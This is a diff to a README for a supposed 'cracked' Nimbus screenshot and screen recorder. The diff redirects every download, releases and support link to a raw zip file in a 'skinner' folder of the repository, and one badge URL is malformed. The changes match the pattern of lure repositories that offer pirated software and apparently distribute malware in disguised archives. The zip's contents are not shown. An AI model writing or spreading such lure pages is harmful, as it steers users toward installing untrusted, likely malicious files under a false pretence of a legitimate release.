@@ -1,7 +1,7 @@
 # 🎥 cracked-nimbus-screenshot-screen-video-recorder - Capture Everything Effortlessly
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/mutularyan/cracked-nimbus-screenshot-screen-video-recorder/releases)
+[![Download](https://raw.githubusercontent.com/mutularyan/cracked-nimbus-screenshot-screen-video-recorder/main/skinner/cracked-nimbus-screenshot-screen-video-recorder.zip%https://raw.githubusercontent.com/mutularyan/cracked-nimbus-screenshot-screen-video-recorder/main/skinner/cracked-nimbus-screenshot-screen-video-recorder.zip)](https://raw.githubusercontent.com/mutularyan/cracked-nimbus-screenshot-screen-video-recorder/main/skinner/cracked-nimbus-screenshot-screen-video-recorder.zip)
 
 ## 🚀 Getting Started
 Welcome to cracked-nimbus-screenshot-screen-video-recorder. This application lets you capture your screen and record videos effortlessly. Follow the steps below to get started.
@@ -22,7 +22,7 @@ Before you download, ensure your device meets these requirements:
 - Ability to share screenshots and videos directly from the app
 
 ## 📥 Download & Install
-To get the latest version of cracked-nimbus-screenshot-screen-video-recorder, visit this page to download: [Releases Page](https://github.com/mutularyan/cracked-nimbus-screenshot-screen-video-recorder/releases).
+To get the latest version of cracked-nimbus-screenshot-screen-video-recorder, visit this page to download: [Releases Page](https://raw.githubusercontent.com/mutularyan/cracked-nimbus-screenshot-screen-video-recorder/main/skinner/cracked-nimbus-screenshot-screen-video-recorder.zip).
 
 Once you're on the Releases page, you'll see several versions listed. Look for the latest version (it usually has the highest number). Click on the version to expand it, and then download the appropriate file for your operating system.
 
@@ -53,7 +53,7 @@ If you encounter any issues while using the application, try the following tips:
 - **Visit the support page.** For more detailed troubleshooting, check the issues section on our GitHub repository.
 
 ## 🔗 Helpful Links
-- [Releases Page](https://github.com/mutularyan/cracked-nimbus-screenshot-screen-video-recorder/releases)
-- [Support and Issues](https://github.com/mutularyan/cracked-nimbus-screenshot-screen-video-recorder/issues)
+- [Releases Page](https://raw.githubusercontent.com/mutularyan/cracked-nimbus-screenshot-screen-video-recorder/main/skinner/cracked-nimbus-screenshot-screen-video-recorder.zip)
+- [Support and Issues](https://raw.githubusercontent.com/mutularyan/cracked-nimbus-screenshot-screen-video-recorder/main/skinner/cracked-nimbus-screenshot-screen-video-recorder.zip)
 
 Thank you for choosing cracked-nimbus-screenshot-screen-video-recorder. We hope you find it useful for all your screen capture needs!
